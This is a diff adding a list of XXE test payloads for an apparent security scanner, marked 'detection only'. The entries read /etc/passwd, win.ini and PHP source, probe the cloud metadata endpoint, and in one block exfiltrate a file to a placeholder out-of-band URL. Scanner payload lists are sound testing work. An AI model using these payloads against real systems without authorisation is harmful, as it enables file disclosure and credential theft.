@@ -1,0 +1,23 @@
+# XXE payloads (multi-line, separated by ---). {CANARY} = unique token,
+# {OOB} = out-of-band base URL (blank when no OOB configured). Detection only.
+# Blocks that reference {OOB} are skipped by the scanner when no OOB URL is set.
+---
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root><a>&xxe;{CANARY}</a></root>
+---
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+<root><a>&xxe;{CANARY}</a></root>
+---
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
+<root><a>&xxe;{CANARY}</a></root>
+---
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY % p SYSTEM "file:///etc/hostname"><!ENTITY % e "<!ENTITY x SYSTEM '{OOB}/?f=%p;'>">%e;]>
+<root><a>&x;{CANARY}</a></root>
+---
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<root><a>&xxe;{CANARY}</a></root>
